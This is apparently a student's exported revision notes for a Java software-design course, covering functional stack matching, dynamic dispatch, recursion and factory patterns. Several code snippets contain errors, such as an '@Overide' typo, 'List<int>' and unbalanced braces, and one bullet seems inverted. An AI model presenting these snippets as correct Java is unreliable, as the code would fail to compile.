<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>T2 2024 Revision</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="1ebd85fc-d902-452d-af18-24c4a29f663c" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">4️⃣</span></div><h1 class="page-title">T2 2024 Revision</h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesCreatedAt"><path d="M8 15.126C11.8623 15.126 15.0615 11.9336 15.0615 8.06445C15.0615 4.20215 11.8623 1.00293 7.99316 1.00293C4.13086 1.00293 0.938477 4.20215 0.938477 8.06445C0.938477 11.9336 4.1377 15.126 8 15.126ZM8 13.7383C4.85547 13.7383 2.33301 11.209 2.33301 8.06445C2.33301 4.91992 4.84863 2.39746 7.99316 2.39746C11.1377 2.39746 13.6738 4.91992 13.6738 8.06445C13.6738 11.209 11.1445 13.7383 8 13.7383ZM4.54102 8.91211H7.99316C8.30078 8.91211 8.54004 8.67285 8.54004 8.37207V3.8877C8.54004 3.58691 8.30078 3.34766 7.99316 3.34766C7.69238 3.34766 7.45312 3.58691 7.45312 3.8877V7.83203H4.54102C4.2334 7.83203 4.00098 8.06445 4.00098 8.37207C4.00098 8.67285 4.2334 8.91211 4.54102 8.91211Z"></path></svg></span>Created time</th><td><time>@July 23, 2024 3:15 PM</time></td></tr></tbody></table></header><div class="page-body"><ul id="3756f687-4070-4227-9a2a-12fc79b54ba2" class="toggle"><li><details><summary>SWEN225</summary><figure id="3820662b-0691-4ed9-bbe8-73bd7967ec3d"><a href="https://ecs.wgtn.ac.nz/cgi-bin/swen225-questions" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title"></div></div><div class="bookmark-href">https://ecs.wgtn.ac.nz/cgi-bin/swen225-questions</div></div></a></figure><ul id="732fd550-bfbe-44bf-8ca5-40a5c758b908" class="toggle"><li><details><summary>Term Test 1</summary><ul id="0db53bf2-f4ba-4ae2-a0e2-ea16c1d4592e" class="toggle"><li><details><summary>Match, Dynamic Dispatch, Internal Direct Recursion Operations</summary><h3 id="c7002e88-fc67-417d-a9c8-ea7021e24fa5" class="">Match</h3><p id="1c8c1cbf-de79-494a-a136-d700ed0a7400" class="">method used to allow you to preform operations on the whole stack</p><ul id="7c41390b-bfe2-493d-94fc-3c9e5e7db0f9" class="bulleted-list"><li style="list-style-type:disc">accepts OnEmpty where you define what to do on an empty stack object (anonymous inner class that overrides of method) and OnElem </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1015a8e5-fb78-44bf-b1c5-618a1cdcf646" class="code"><code class="language-Java">interface Stack{
		static Stack empty(){ return new Stack(){}; }
		
		interface OnEmpty&lt;R&gt;{ R of(); }
		interface OnElem&lt;R&gt;{ R of(int elem, Stack tail); }
		
		default &lt;R&gt; R match(OnEmpty&lt;R&gt; a, OnElem&lt;R&gt; b){ return a.of(); }
		
		default Stack push(int top){
				Stack self = this;
				return new Stack(){
						@Overide public &lt;R&gt; R match(OnEmpty&lt;R&gt; a, OnElem&lt;R&gt; b){
								return b.of(top,self);
						}
				}
		}
}

Stack s0 = Stack.empty().push(1).push(2).push(3);

String res = s0.match(
		() -&gt; &quot;empty&quot;,
		(top, tail) -&gt; &quot;&quot;+top
);</code></pre><h3 id="68dd26d4-e19d-4e0e-94dd-24c540e2fd96" class="">Dynamic Dispatch</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="69bcbd44-2f73-478b-a574-c14bff2dcf3b" class="code"><code class="language-Java">interface Stack{
		static Stack empty(){ return new Stack(){}; }
		
		interface OnEmpty&lt;R&gt;{ R of(); }
		interface OnElem&lt;R&gt;{ R of(int elem, Stack tail); }
		
		default &lt;R&gt; R match(OnEmpty&lt;R&gt; a, OnElem&lt;R&gt; b){ return a.of(); }
		
		default Stack push(int top){
				Stack self = this;
				return new Stack(){
						@Overide public &lt;R&gt; R match(OnEmpty&lt;R&gt; a, OnElem&lt;R&gt; b){
								return b.of(top,self);
						}
						//onelem/inductive case
						public int size(){
								return 1 + self.size(); //recursive call
						}
				}
		}
		
		public int size(){ return 0; } //size on empty/base case
}

</code></pre><h3 id="9a4644a9-a822-4f3b-8930-bf3d5e4692c7" class="">Internal Direct Recursion </h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="544d49be-3dda-40ef-9b71-30c7551a683a" class="code"><code class="language-Java">interface Stack{
 static Stack empty(){ return new Stack(){
 
 default int max(){ throw new Error(&quot;..&quot;); }
		default int max(int t){ return t; }
		
		default Stack push(int top){
				Stack tail= this;
				return new Stack(){
					 public int max(){ return tail.max(top); }
					 public int max(int t){ return tail.max(Math.max(t,top)); }
				}; 
		}
}</code></pre></details></li></ul><ul id="d55468d7-a8ed-44e3-8d4b-2717bf032f4e" class="toggle"><li><details><summary>Factory Method</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="16f1d1c3-121e-4c76-a805-58b0f1afa33c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">abstract away the object that is actually created using a <mark class="highlight-yellow_background">static</mark> factory <mark class="highlight-yellow_background">method to return an object</mark><ul id="d3ed1f54-7a7a-4914-a349-01c77effdaa1" class="bulleted-list"><li style="list-style-type:disc">method may use new keyword but the client doesn’t</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="69a7bd1c-b932-467e-929e-1eb744893626" class="code"><code class="language-Java">interface List&lt;E&gt;{
		//factory methods
		static List&lt;E&gt; of(){ return new ArrayList&lt;&gt;();}
		static List&lt;E&gt; of(E... es) {
        return new ImmutableCollections.List&lt;&gt;(es);
    }
}

List&lt;int&gt; todo = List.of();
todo = List.of(1,2,3,4,6);</code></pre><ul id="953a0f4a-210e-4ea7-834e-2d1bed58ccf6" class="bulleted-list"><li style="list-style-type:disc">allows you to create instances of but prevents exposing private concrete types (private inner classes)</li></ul><ul id="5ecf9449-b921-4c47-a847-3650d175510d" class="bulleted-list"><li style="list-style-type:disc">avoids creating duplicated objects using new</li></ul><ul id="ca26dc70-5d46-45d4-8b9e-f69f988fdd51" class="bulleted-list"><li style="list-style-type:disc">to keep the freedom of changing the concrete type during code evolution </li></ul><ul id="a149f772-d4c4-4664-95c8-c075ce9794bf" class="bulleted-list"><li style="list-style-type:disc">client code will lose control on object instantiation and cannot use new to create these objects</li></ul><ul id="4bc0b381-1146-4711-a2a3-7513696f55f2" class="bulleted-list"><li style="list-style-type:disc">library code will gain control of object instantiation and will be able to evolve better</li></ul></div></figure></details></li></ul><ul id="fb45271c-613e-418a-bfb2-72dce11f4264" class="toggle"><li><details><summary>Abstract Factory Patterns</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="6a88ab59-ed7e-4b47-8550-cd0039944399"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">client <mark class="highlight-yellow_background">receives a factory</mark> object that is able to <mark class="highlight-yellow_background">make a specific product</mark> using a factory method<ul id="ce94613d-36f2-4913-8a98-bb3afcc911b5" class="bulleted-list"><li style="list-style-type:disc">client needs to <mark class="highlight-yellow_background">create different kinds of similar objects</mark>, but code needs to be <mark class="highlight-yellow_background">parametric on what concrete kind of object to create</mark></li></ul><ul id="defadb94-29f8-4d1b-9661-6f6eb1c0cc05" class="bulleted-list"><li style="list-style-type:disc">client can not invoke with different factory objects</li></ul><ul id="ff992d6b-36d3-4cab-a127-834f84656de8" class="bulleted-list"><li style="list-style-type:disc">client behaviour is more flexible and testable</li></ul><figure id="a3e77526-aa1c-434c-b164-8586be5033e7" class="image"><a href="Untitled.png"><img style="width:624px" src="Untitled.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c9f6ef1-b5f1-4486-9381-50ace1b99139" class="code"><code class="language-Java">interface Animal{/*..*/} //Pre existing code
class Human implements Animal{/*..*/} //Pre existing code
class Cat implements Animal{/*..*/} //Pre existing code
class Dog implements Animal{/*..*/} //Pre existing code

Supplier&lt;Animal&gt; dogs = Dog::new;
Supplier&lt;Animal&gt; cats = Cat::new;
Supplier&lt;Human&gt; bobs = Human::new;

void clientCode(Supplier&lt;Animal&gt; animals){ 
		animals.get();
}

record Druid(List&lt;Supplier&lt;Animal&gt;&gt; summons){/*..*/}</code></pre></div></figure><h3 id="833ae629-dc57-4a56-ab8e-da13833dc7db" class="">Example</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d1376e3-96cc-45be-8c5e-b3dc0451f10b" class="code"><code class="language-Java">//abstract products

interface Button {
    void render();
}

interface Checkbox {
    void render();
}

//concrete products
class WindowsButton implements Button {
    @Override
    public void render() {
        System.out.println(&quot;Rendering a Windows button&quot;);
    }
}

class MacButton implements Button {
    @Override
    public void render() {
        System.out.println(&quot;Rendering a Mac button&quot;);
    }
}

class WindowsCheckbox implements Checkbox {
    @Override
    public void render() {
        System.out.println(&quot;Rendering a Windows checkbox&quot;);
    }
}

class MacCheckbox implements Checkbox {
    @Override
    public void render() {
        System.out.println(&quot;Rendering a Mac checkbox&quot;);
    }
}

//abstract factory

interface GUIFactory {
    Button createButton();
    Checkbox createCheckbox();
}

//concrete factory
class WindowsFactory implements GUIFactory {
    @Override
    public Button createButton() {
        return new WindowsButton();
    }

    @Override
    public Checkbox createCheckbox() {
        return new WindowsCheckbox();
    }
}

class MacFactory implements GUIFactory {
    @Override
    public Button createButton() {
        return new MacButton();
    }

    @Override
    public Checkbox createCheckbox() {
        return new MacCheckbox();
    }
}

//client code

public class Application {
    private Button button;
    private Checkbox checkbox;

    public Application(GUIFactory factory) {
        button = factory.createButton();
        checkbox = factory.createCheckbox();
    }

    public void render() {
        button.render();
        checkbox.render();
    }

    public static void main(String[] args) {
        GUIFactory factory;
        String OS = &quot;Windows&quot;; // This could be dynamically determined at runtime

        if (OS.equals(&quot;Windows&quot;)) {
            factory = new WindowsFactory();
        } else {
            factory = new MacFactory();
        }

        Application app = new Application(factory);
        app.render();
    }
